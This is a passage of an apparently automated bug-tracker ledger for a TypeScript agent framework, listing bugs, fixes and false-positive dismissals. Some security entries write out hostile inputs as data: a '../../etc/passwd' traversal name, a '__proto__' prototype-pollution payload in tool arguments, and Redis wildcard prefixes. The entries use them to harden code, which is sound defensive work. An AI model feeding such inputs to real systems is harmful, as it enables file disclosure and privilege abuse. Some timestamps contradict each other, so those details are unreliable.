- **description:** `rankAndLoad` silently returns an empty `LoadResult` when the task string contains only short words (<3 chars) or stopwords, with no warning or fallback.
- **context:** `extractTagsFromString` strips words shorter than 3 characters and removes stopwords. Tasks like `"go"`, `"do it"`, `"run"`, or `"ok"` produce `taskTags = []`, causing the function to return `{ units: [], totalTokens: 0 }` with no log message. The caller (`MemoryLoader.match()`) receives an empty result with no indication that memory loading was skipped entirely. The agent proceeds with no domain context loaded.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** `2026-03-20T04:07:17Z`
- **fixer_completed:** `2026-03-20T04:07:17Z`
- **fix_summary:** `False positive — line 96 already logs warning and returns empty result when taskTags empty. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0262
- **status:** `verified`
- **severity:** `medium`
- **file:** `packages/tools/src/web-search/brave.ts`
- **line:** `45`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `res.json()` is returned without a try/catch after confirming `res.ok`, so a non-JSON 200 response (proxy page, truncated body) throws an unhandled `SyntaxError`.
- **context:** Same pattern exists in `packages/tools/src/web-search/exa.ts:52`, `packages/tools/src/web-search/tavily.ts:46`, and `packages/tools/src/browser/firecrawl.ts:51`. During an API incident or proxy error, the raw `SyntaxError` propagates with no indication of which tool or URL caused it. The GitHub tool helper at `packages/tools/src/github/index.ts:67` has the same issue (tracked as BUG-0241).
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** `2026-03-20T04:07:17Z`
- **fixer_completed:** `2026-03-20T04:07:17Z`
- **fix_summary:** `False positive — brave.ts already wraps res.json() in try-catch at lines 46-49 with descriptive error. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0263
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `100`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `fix/BUG-0263-duck-typed-handoff-opts-guard`
- **description:** Duck-typed Handoff detection at line 100 checks `(result as any).isHandoff` but constructs `new Handoff((result as any).opts)` without verifying `.opts` exists, so a duck-typed object with `isHandoff: true` but no `opts` produces a malformed Handoff.
- **context:** A third-party agent returning `{ isHandoff: true }` without an `opts` property passes the guard and feeds `undefined` to the `Handoff` constructor. Whether this crashes or produces silent corruption depends on the constructor's handling of `undefined`. Adding `&& (result as any).opts` to the guard would prevent this.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** `2026-03-20T07:34:29Z`
- **fixer_completed:** `2026-03-20T07:34:35Z`
- **fix_summary:** `Added opts guard validating to/message strings before Handoff construction. Throws descriptive error for malformed duck-typed objects. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/handoff-duck-typed-opts-guard.test.ts`

---

### BUG-0264
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/lsp/client.ts`
- **line:** `526`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `fix/BUG-0264-jsonrpc-structural-validation`
- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T07:34:35Z`
- **fix_summary:** `Full JSON-RPC 2.0 structural validation in handleMessage(): jsonrpc version gate, id type check, method type check, result/error presence. Branch ready for merge. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0265
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/models/anthropic.ts`
- **line:** `398`
- **category:** `logic-bug`
- **description:** `chat()` returns `stopReason: "tool_use"` even when all tool_use blocks were for structured output (responseFormat), so callers see `stopReason: "tool_use"` instead of `"end"` on structured output responses.
- **context:** CI Sentinel detected regression on main branch. `mapStopReason` at line 175 converts `"tool_use"` to `"tool_use"` unconditionally. When `responseFormat.type === "json_schema"` is used, the tool_use block is a synthetic internal tool — after filtering it from `toolCalls` (line 380), `stopReason` should be overridden to `"end"`. Without this, the agent harness sees `stopReason: "tool_use"` and enters tool-processing logic for a response that has no tool calls, causing incorrect agent behavior. Test "extracts parsed from tool_use input, not text content" in `src/__tests__/structured-output.test.ts` fails at line 337.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0265`
- **hunter_found:** `2026-03-19T22:00:00Z`
- **fixer_started:** `2026-03-19T23:21:32Z`
- **fixer_completed:** `2026-03-19T23:21:32Z`
- **fix_summary:** `Changed const to let for stopReason in src/models/anthropic.ts chat(). Added conditional: when stopReason is "tool_use" but toolCalls is empty and rfName is set (structured output mode), override stopReason to "end" since all tool_use blocks were synthetic.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/anthropic-chat-stopreason-override.test.ts`

---

### BUG-0266
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/pregel/index.ts`
- **line:** `1`
- **category:** `test-regression`
- **description:** Subgraph checkpoint namespace isolation is not implemented — child subgraph checkpoints are stored under the parent threadId instead of `"parentId:subgraphName"`, so `cp.list("parent-1:child")` returns zero results.
- **context:** CI Sentinel detected regression on main branch. Test "subgraph checkpoints are isolated from parent" in `src/__tests__/checkpoint-namespace.test.ts` fails at line 40: `expected 0 to be greater than 0`. When a subgraph is added via `outer.addSubgraph("child", ...)`, the compiled inner graph should checkpoint using a namespaced threadId (`"parent-1:child"`) to prevent checkpoint key collisions between parent and child graphs sharing the same checkpointer. Currently all checkpoints land under the parent threadId, making namespace isolation impossible.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0266`
- **hunter_found:** `2026-03-19T22:00:00Z`
- **fixer_started:** `2026-03-19T23:21:32Z`
- **fixer_completed:** `2026-03-19T23:21:32Z`
- **fix_summary:** `In src/pregel/streaming.ts, computed namespacedThreadId as "parentThreadId:subgraphName" and passed it as the child graph's threadId instead of the opaque invocationKey. Registered parent checkpointer directly under the namespaced key. Also updated src/graph.ts addSubgraph fallback. Subgraph checkpoints now isolated under "parent-1:child" namespace.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0267
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/swarm/agent-node.ts`
- **line:** `100`
- **category:** `test-regression`
- **description:** Handoff routing is broken — agents returning a `Handoff` object do not route to the target agent, causing 3 tests across 2 files to fail with `result.done === false`.
- **context:** CI Sentinel detected regression on main branch. Tests "spawned agent that returns a Handoff routes to the handoff target" (`src/__tests__/swarm/dynamic-spawn.test.ts:112`) and "agent returning Handoff routes to target agent" (`src/__tests__/swarm/handoff-execution.test.ts:67`) both fail with `expected false to be true`. Stderr shows `applyUpdate: unknown channel key "isHandoff" — skipping (not in channel schema)`, confirming that the Handoff marker is being treated as a state update rather than a routing directive. The duck-typed `isHandoff` detection at line 100 is not intercepting the return value before it reaches the state updater.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0267`
- **hunter_found:** `2026-03-19T22:00:00Z`
- **fixer_started:** `2026-03-19T23:21:32Z`
- **fixer_completed:** `2026-03-19T23:21:32Z`
- **fix_summary:** `Fixed Handoff routing in 3 files: (1) src/pregel/state-helpers.ts applyUpdate() now detects Handoff objects via isHandoff duck-type and stores them as __pendingHandoff instead of iterating keys through channel schema. (2) src/pregel/streaming.ts updated to handle passthrough. (3) src/swarm/agent-node.ts extended to check result.__pendingHandoff in addition to instanceof Handoff.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0268
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/harness/loop/index.ts`
- **line:** `55`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0268`
- **description:** `fireSessionStart` is awaited outside the main `try` block, so a hook error aborts the entire agent loop before any turn executes with no error message yielded to the caller.
- **context:** The `try` block wrapping the main loop begins at line 81. Every other hook call (`firePreCompact`, `firePostCompact`, `fireStop`, `fireSessionEnd`) is inside a guarded block. A throwing session-start hook kills the generator with an unhandled error and no cleanup.
- **hunter_found:** `2026-03-19T20:18:00Z`
- **fixer_started:** `2026-03-20T03:42:19Z`
- **fixer_completed:** `2026-03-20T03:42:19Z`
- **fix_summary:** `Removed throw err from fireSessionStart catch block in src/harness/loop/index.ts. The catch already yields the error but then re-threw, aborting the generator. Now catches, yields, and continues — consistent with other hook error handlers.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0269
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/swarm/snapshot.ts`
- **line:** `174`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0269`
- **description:** `deepEqual` cycle-detection uses two independent `WeakSet`s checked with AND, so an object seen in `seenA` from one comparison pair and an unrelated object seen in `seenB` from a different pair can both pass the check, returning `true` for non-equal cyclic structures.
- **context:** The correct approach tracks `(a, b)` pairs together (e.g., a `Map<object, Set<object>>`). As written, cross-pair contamination in the WeakSets produces false equality for cyclic agent state snapshots, defeating change detection in the swarm snapshot system.
- **hunter_found:** `2026-03-19T20:18:00Z`
- **fixer_started:** `2026-03-20T07:48:33Z`
- **fixer_completed:** `2026-03-20T07:48:33Z`
- **fix_summary:** `Replaced WeakSets with Map-based pair tracking in deepEqual.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/snapshot-deepequal-cycles.test.ts`

---

### BUG-0270
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/pdf.ts`
- **line:** `24`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0270`
- **description:** `readFile(source)` is called outside any try/catch, so filesystem errors (ENOENT, EACCES) propagate as raw Node.js errors with no loader-level context.
- **context:** The try/catch at line 16 only guards the dynamic `import()` of pdfjs-dist. A missing or inaccessible PDF file produces a raw `ENOENT` with no indication it came from the PDF loader. Same pattern in `docx.ts:20` and `csv.ts:10`.
- **hunter_found:** `2026-03-19T20:18:00Z`
- **fixer_started:** `2026-03-20T07:48:33Z`
- **fixer_completed:** `2026-03-20T07:48:33Z`
- **fix_summary:** `Wrapped readFile in try/catch across pdf/docx/csv loaders.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0271
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/swarm/self-improvement/skill-evolver.ts`
- **line:** `186`
- **category:** `test-regression`
- **description:** Test "BUG-0078: safeSkillPath does not throw ReferenceError from require() in ESM" in `src/__tests__/skill-evolver-esm-path.test.ts` fails: `commitOrRevert("../../etc/passwd", ...)` resolves instead of rejecting with "Path traversal detected".
- **context:** CI Sentinel detected regression on main branch. `commitOrRevert` validates content format before calling `safeSkillPath`. When the test passes a path-traversal skillName with content that does not start with `#` or `---`, the content validation guard (line 204) returns early before `safeSkillPath` at line 228 can throw the expected "Path traversal detected" error. The path traversal guard is bypassed by the content format check. Fix: validate path traversal via `safeSkillPath` before content format checks, so security rejections always throw regardless of content.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0271`
- **hunter_found:** `2026-03-19T22:59:15Z`
- **fixer_started:** `2026-03-19T23:21:32Z`
- **fixer_completed:** `2026-03-19T23:21:32Z`
- **fix_summary:** `Moved safeSkillPath(skillName) call to the top of commitOrRevert() in src/swarm/self-improvement/skill-evolver.ts, before content format validation checks. Path traversal is now always validated first regardless of content format, so "../../etc/passwd" correctly throws "Path traversal detected".`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/skill-evolver-path-traversal-order.test.ts`

---

### BUG-0272
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/swarm/factories.ts`
- **line:** `371`
- **category:** `test-regression`
- **description:** Test "terminates at maxRounds if no consensus" in `src/__tests__/swarm/template-debate.test.ts` fails: `judgeModel.chat` called 1 time instead of expected 2 times when `maxRounds: 2`.
- **context:** CI Sentinel detected regression on main branch. The debate judge node termination condition at line 371 uses `nextRound >= config.judge.maxRounds`. With `maxRounds: 2`, after the second judge invocation (round=1), `nextRound=2 >= 2` is true — the graph terminates after only 1 chat call. The test expects `chat` to be called exactly `maxRounds` (2) times, implying the condition should be `nextRound > config.judge.maxRounds` (off-by-one fix) so the judge runs exactly `maxRounds` real evaluation cycles before stopping.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0272`
- **hunter_found:** `2026-03-19T22:59:15Z`
- **fixer_started:** `2026-03-19T23:26:27Z`
- **fixer_completed:** `2026-03-19T23:26:27Z`
- **fix_summary:** `Changed debate judge termination condition in src/swarm/factories.ts line 371 from nextRound >= config.judge.maxRounds to nextRound > config.judge.maxRounds. Judge now runs exactly maxRounds evaluation cycles before stopping.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0273
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/harness/memory/ranker.ts`
- **line:** `101`
- **category:** `test-regression`
- **description:** Test "drops units that score below matchThreshold" in `src/__tests__/memory-loader.test.ts` fails: expected 0 units returned but got 1 — a non-episodic unit scoring exactly at `matchThreshold` (0.2) is not filtered out.
- **context:** CI Sentinel detected regression on main branch. The `rankAndLoad` relevance filter uses `score >= matchThreshold`. Non-episodic units with zero tag overlap receive `recencyScore=1`, yielding `score = 0 * 0.8 + 1 * 0.2 = 0.2` — exactly equal to the default `matchThreshold` of `0.2`. The test asserts 0 units returned (expecting strictly-below semantics). Fix: change filter condition to `score > matchThreshold` to exclude boundary-equal units as the test requires.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0273`
- **hunter_found:** `2026-03-19T22:59:15Z`
- **fixer_started:** `2026-03-19T23:26:27Z`
- **fixer_completed:** `2026-03-19T23:26:27Z`
- **fix_summary:** `Changed relevance filter in src/harness/memory/ranker.ts line 101 from score >= matchThreshold to score > matchThreshold. Boundary-equal units (score === 0.2 with threshold 0.2) are now excluded.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/memory-ranker-threshold-strict.test.ts`

---

### BUG-0274
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/models/google.ts`
- **line:** `338`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0274`
- **description:** `candidate.content.parts` is accessed without a null check on `candidate.content`, which the Gemini API omits when finishReason is "SAFETY" or "RECITATION", causing a runtime TypeError.
- **context:** Line 325–326 guards `!candidate` but not `!candidate.content`. The streaming path (line 414) correctly checks `!candidate.content` with a `continue`, but the synchronous `chat()` path does not — accessing `.parts` on undefined throws. Any safety-filtered Gemini response crashes the non-streaming code path.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-19T23:26:27Z`
- **fixer_completed:** `2026-03-19T23:26:27Z`
- **fix_summary:** `Added null check for candidate.content in src/models/google.ts chat() path after the existing !candidate guard. When content is missing (SAFETY/RECITATION filtered), returns empty response gracefully matching the streaming path pattern.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0275
- **status:** `verified`
- **severity:** `high`
- **file:** `src/models/openrouter.ts`
- **line:** `472`
- **category:** `api-contract-violation`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `finish_reason` check for emitting `tool_call_end` events is nested inside `if (delta)`, so when the API sends a final chunk with `finish_reason: "tool_calls"` but no `delta` object, the event is never emitted.
- **context:** The OpenAI adapter correctly reads `finishReason` from `choice` (outside the delta block). In `openrouter.ts` the check at line 472 is inside `if (delta)`, making it unreachable when delta is absent. This means streaming tool calls never receive an end event, leaving callers that depend on `tool_call_end` to finalize tool invocations stuck indefinitely.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T03:42:19Z`
- **fixer_completed:** `2026-03-20T03:42:19Z`
- **fix_summary:** `False positive — already fixed on main. The finish_reason check is already outside the if (delta) block at line 475, with a code comment confirming this. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0276
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/pregel/execution.ts`
- **line:** `160`
- **category:** `api-contract-violation`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0276`
- **test_generated:** `true`
- **test_file:** `src/__tests__/circuit-breaker-fallback-args.test.ts`
- **description:** The circuit breaker fallback in `execution.ts` calls `fallback(state, err)` with two arguments, but `CircuitBreaker.execute()` in `circuit-breaker.ts:36` calls `this.config.fallback()` with zero arguments — the two invocation sites have incompatible signatures.
- **context:** A user registering a fallback that expects `(state, error)` would have it work correctly when triggered from `execution.ts:160` but receive `undefined` for both parameters when triggered from the `CircuitBreaker` class directly. This makes the fallback contract unreliable depending on which code path triggers it.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T03:42:19Z`
- **fixer_completed:** `2026-03-20T03:42:19Z`
- **fix_summary:** `Added state parameter to CircuitBreaker.execute() in src/circuit-breaker.ts. Both fallback call sites (open and half_open) now pass state instead of undefined. Typed fallback as (state: unknown, error: Error) => unknown. Updated execution.ts to pass state to cb.execute(executeWithTimeout, state).`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0277
- **status:** `verified`
- **severity:** `high`
- **file:** `src/swarm/pool.ts`
- **line:** `209`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `agent.hooks?.onComplete?.()` is awaited without a try/catch, so a throwing `onComplete` hook causes `invoke()` to reject even though the agent task already succeeded, discarding the valid result.
- **context:** The result is computed at line 205 but a hook error before the return statement at line 210 causes the caller to see a failure. Unlike PostToolUse error handling in `tools.ts`, there is no isolated try/catch around the completion hook. The successful computation is lost.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T03:42:19Z`
- **fixer_completed:** `2026-03-20T03:42:19Z`
- **fix_summary:** `False positive — already fixed on main. The onComplete hook at line 222 is already wrapped in try/catch that logs a warning and continues. Result is returned regardless. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0278
- **status:** `verified`
- **severity:** `high`
- **file:** `src/checkpointers/redis.ts`
- **line:** `180`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0278`
- **test_generated:** `true`
- **test_file:** `src/__tests__/redis-checkpointer-corrupt.test.ts`
- **description:** `JSON.parse(raw) as ONICheckpoint<S>` deserializes stored checkpoint data without any field validation, so a corrupted or truncated Redis entry yields a checkpoint object missing required fields that only blows up later.
- **context:** The Postgres checkpointer (`src/checkpointers/postgres.ts:122`) has a full `deserialize()` method that validates each field and throws a typed `CheckpointCorruptError`. The Redis checkpointer skips all validation, so corruption in Redis silently produces a partial checkpoint that causes downstream failures far from the deserialization site.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T03:42:19Z`
- **fixer_completed:** `2026-03-20T03:42:19Z`
- **fix_summary:** `Added validation for pendingSends, metadata, and pendingWrites in Redis checkpointer deserialize() in src/checkpointers/redis.ts. Each optional field checked for correct type and throws CheckpointCorruptError on mismatch, matching Postgres checkpointer pattern.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0279
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/self-improvement/manifest.ts`
- **line:** `50`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0279`
- **description:** The regex-captured `m[3]` value is cast to `"minimize" | "maximize"` without validating the parsed string is one of those values, so a MANIFEST.md with `direction: sideways` is silently accepted.
- **context:** Downstream code in `pattern-learner.ts` uses `r.direction ?? "minimize"` for gain calculation sign logic. An invalid direction value passes TypeScript's narrowing but produces incorrect metric evaluation at runtime, potentially inverting optimization decisions.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T07:48:33Z`
- **fixer_completed:** `2026-03-20T07:48:33Z`
- **fix_summary:** `Validated direction field in manifest.ts parser.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0280
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/guardrails/filters.ts`
- **line:** `128`
- **category:** `api-contract-violation`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0280`
- **description:** When a filter returns `blocked: true` with a `redacted` value, the redaction path continues processing but the final return omits `blockedBy` and `reason` fields, losing audit information about which filter triggered the rewrite.
- **context:** Callers that log or audit filter decisions lose visibility into redaction events. The block path (line 135) correctly includes `blockedBy` and `reason`, but the redact-and-continue path at line 129 drops that information from the return at line 143.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T07:48:33Z`
- **fixer_completed:** `2026-03-20T07:48:33Z`
- **fix_summary:** `Added blockedBy and reason to redact-and-continue path in filters.ts.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/guardrails-filters-redact-audit.test.ts`

---

### BUG-0281
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `196`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0281`
- **description:** `agent.hooks?.onStart?.()` is awaited without a try/catch, so a throwing `onStart` hook aborts the slot run entirely and bypasses the retry loop.
- **context:** The `onError` hook handles retry exhaustion, but an `onStart` exception propagates directly to the `invoke()` caller with no retry attempt and no hook-level error isolation. The queued work is never attempted.
- **hunter_found:** `2026-03-19T23:05:00Z`
- **fixer_started:** `2026-03-20T07:48:33Z`
- **fixer_completed:** `2026-03-20T07:48:33Z`
- **fix_summary:** `Wrapped onStart hook in try/catch in pool.ts.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0282
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/github/index.ts`
- **line:** `195`
- **category:** `security-injection`
- **description:** `createPrTool` passes `head` and `base` branch names directly to the GitHub API body without validation. `owner` and `repo` are sanitized via `GITHUB_SLUG_RE`, but `head` (which supports cross-repo `owner:branch` syntax) and `base` have no equivalent check.
- **context:** An LLM-supplied `head` value containing a malformed or specially crafted reference (e.g. excessively long, containing CRLF characters, or an unexpected cross-repo `owner:branch` format with embedded special characters) is forwarded verbatim to the GitHub REST API. The absence of client-side validation is inconsistent with the validated `owner`/`repo` paths and creates a latent injection surface for future callers who may compose URLs or log these values. Fix: validate `head` and `base` against a branch name regex (allowing `owner:branch` for cross-repo PRs, but rejecting control characters, CRLF, and oversized values). OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0282`
- **hunter_found:** `2026-03-20T14:20:00Z`
- **fixer_started:** `2026-03-20T07:56:44Z`
- **fixer_completed:** `2026-03-20T07:56:44Z`
- **fix_summary:** `Validated head and base branch names in createPrTool against GITHUB_BRANCH_RE pattern.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/github-branch-name-validation.test.ts`

---

### BUG-0283
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/integrations/src/adapter/index.ts`
- **line:** `42`
- **category:** `security-injection`
- **description:** `adaptActivePiece.execute()` passes the raw LLM-supplied `input` object directly to `action.run({ propsValue: input })` without stripping prototype-polluting keys (`__proto__`, `constructor`, `prototype`).
- **context:** The core harness at `src/harness/loop/tools.ts:86` explicitly strips `__proto__`, `constructor`, and `prototype` keys before merging modified tool input. The integrations adapter has no equivalent guard — an LLM-supplied JSON payload containing `{"__proto__": {"isAdmin": true}}` reaches `action.run()` unfiltered. If any integration piece implementation iterates `propsValue` using `Object.assign` or spread, prototype pollution would occur. The `propsToJsonSchema` function generates a schema but no runtime validation is applied against it at the execute boundary. Fix: apply key stripping (removing `__proto__`, `constructor`, `prototype`) to `input` inside `execute()` before forwarding to `action.run()`. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0283`
- **hunter_found:** `2026-03-20T14:20:00Z`
- **fixer_started:** `2026-03-20T07:56:44Z`
- **fixer_completed:** `2026-03-20T07:56:44Z`
- **fix_summary:** `Stripped prototype-polluting keys from integration input before passing to action.run.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `packages/integrations/src/__tests__/adapter-proto-pollution.test.ts`

---

### BUG-0284
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `249`
- **category:** `security-injection`
- **description:** `listNamespaces()` constructs a Redis `KEYS` glob pattern as `` `oni:store:idx:${this.prefix}:*` `` without validating `this.prefix` for Redis glob metacharacters (`*`, `?`, `[`, `]`).
- **context:** `this.prefix` comes from caller-supplied `RedisStoreConfig.prefix` with no sanitization — `config.prefix ?? "default"` at line 65. A prefix containing Redis wildcards (e.g. `*` or `[a-z]`) causes the `KEYS` pattern to match keys outside the intended namespace, leaking key names from other prefixes or co-tenants sharing the Redis instance. Additionally, `KEYS` is O(N) over the entire keyspace — a wildcard prefix like `*` makes `listNamespaces()` scan every Redis key, causing latency spikes or DoS under load. Fix: validate `prefix` at `create()` time to reject values containing `*`, `?`, `[`, or `]`, or escape them before constructing the pattern. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0284`
- **hunter_found:** `2026-03-20T14:20:00Z`
- **fixer_started:** `2026-03-20T07:56:44Z`
- **fixer_completed:** `2026-03-20T07:56:44Z`
- **fix_summary:** `Escaped Redis glob metacharacters in listNamespaces prefix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `packages/stores/src/__tests__/redis-list-namespaces-glob-escape.test.ts`

---


### BUG-0285
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/sse.ts`
- **line:** `35`
- **category:** `security-config`
- **description:** `createSSEResponse()` returns a `Response` with no security headers — the SSE code path is the only response path in `A2AServer` that omits `X-Content-Type-Options`, `X-Frame-Options`, and `Content-Security-Policy`.
- **context:** Every other response path in `packages/a2a/src/server/index.ts` merges `SECURITY_HEADERS` (defined at line 8) into its returned `Response`. The SSE path at line 99 calls `return createSSEResponse(result.stream, result.taskId ?? "")` and returns the result directly — `createSSEResponse` only sets `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and `Connection: keep-alive`. A browser receiving the SSE stream has no `X-Content-Type-Options: nosniff`, allowing MIME-sniffing of event data. Missing `X-Frame-Options` and `Content-Security-Policy` leave the SSE endpoint unprotected from framing attacks. Fix: merge `SECURITY_HEADERS` at the call site in `index.ts`. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0285-sse-security-headers`
- **hunter_found:** `2026-03-21T03:25:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T08:11:25Z`
- **fix_summary:** `Added SECURITY_HEADERS to SSE response in sse.ts with optional extraHeaders param. Also spread into all index.ts response paths for consistency. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `packages/a2a/src/__tests__/sse-security-headers.test.ts`

---

### BUG-0286
- **status:** `verified`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `383`
- **category:** `security-config`
- **description:** `console.warn` in the Gemini `chat()` structured-output parsing failure path logs the full raw model response content, disclosing potentially sensitive LLM output to server logs.
- **context:** When `responseFormat` is set and the model returns non-JSON content, the catch block at line 381-385 logs the full `content` variable. This may contain PII, confidential business data, or user-supplied secrets appearing in model output. The equivalent path in `src/models/openai.ts:300` correctly logs only `content?.length ?? 0`. Fix: replace `Raw content: ${content}` with `Content length: ${content?.length ?? 0}` to match the OpenAI adapter pattern. OWASP A09:2021 - Security Logging and Monitoring Failures.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T03:25:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T08:11:25Z`
- **fix_summary:** `False positive — no console.warn or raw content logging in structured-output catch block at lines 331-333 of google.ts. Catch block silently leaves parsed undefined. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0287
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/harness/loop/tools.ts`
- **line:** `172`
- **category:** `security-injection`
- **description:** LLM-supplied `toolCall.args` is passed directly to `toolDef.execute()` without stripping prototype-polluting keys — the proto-sanitization at lines 82-93 only runs on the hook's `modifiedInput`, not on the original `toolCall.args` from the LLM.
- **context:** When a `PreToolUse` hook is absent or does not return `modifiedInput`, the raw `toolCall.args` (JSON-parsed from LLM output) is forwarded to `execute()` at line 172 without any key sanitization. An LLM generating `{"__proto__": {"isAdmin": true}}` as tool arguments would pass prototype-polluting keys to every tool implementation. The `stripProtoKeys` function on line 82 is only invoked to sanitize `preResult.modifiedInput` — the original object on `toolCall.args` is never cleaned. Fix: apply `stripProtoKeys` to `toolCall.args` unconditionally at the top of the per-tool processing block, before hook invocation. OWASP A03:2021 - Injection.
